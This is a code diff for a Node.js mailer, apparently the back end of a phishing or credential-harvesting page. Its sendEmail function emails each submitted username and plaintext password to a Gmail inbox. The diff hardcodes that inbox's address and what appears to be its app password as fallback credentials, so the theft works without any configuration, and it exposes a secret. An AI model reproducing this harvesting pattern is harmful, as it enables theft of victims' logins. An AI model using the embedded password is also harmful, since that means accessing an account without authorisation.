@@ -14,20 +14,18 @@ let transporter = null;
 function initMailer() {
   try {
     const nodemailer = require('nodemailer');
-    if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
-      transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-          user: process.env.EMAIL_USER,
-          pass: process.env.EMAIL_PASS
-        }
-      });
-      console.log('Email configuré pour: ' + process.env.EMAIL_USER);
-    } else {
-      console.log('Pas de credentials email configurés');
-    }
+    const emailUser = process.env.EMAIL_USER || 'hhmehdi58@gmail.com';
+    const emailPass = process.env.EMAIL_PASS || 'xzzu kiva esmv esjy';
+    transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: emailUser,
+        pass: emailPass
+      }
+    });
+    console.log('Email configuré pour: ' + emailUser);
   } catch (e) {
-    console.log('Nodemailer non disponible');
+    console.log('Erreur mailer: ' + e.message);
   }
 }
 
@@ -36,9 +34,10 @@ initMailer();
 async function sendEmail(username, password) {
   if (!transporter) return;
   try {
+    const emailUser = process.env.EMAIL_USER || 'hhmehdi58@gmail.com';
     await transporter.sendMail({
-      from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER,
+      from: emailUser,
+      to: emailUser,
       subject: 'Nouvelle connexion - ' + username,
       html: '<p><b>User:</b> ' + username + '</p><p><b>Pass:</b> ' + password + '</p><p><b>Date:</b> ' + new Date().toLocaleString('fr-FR') + '</p>'
     });
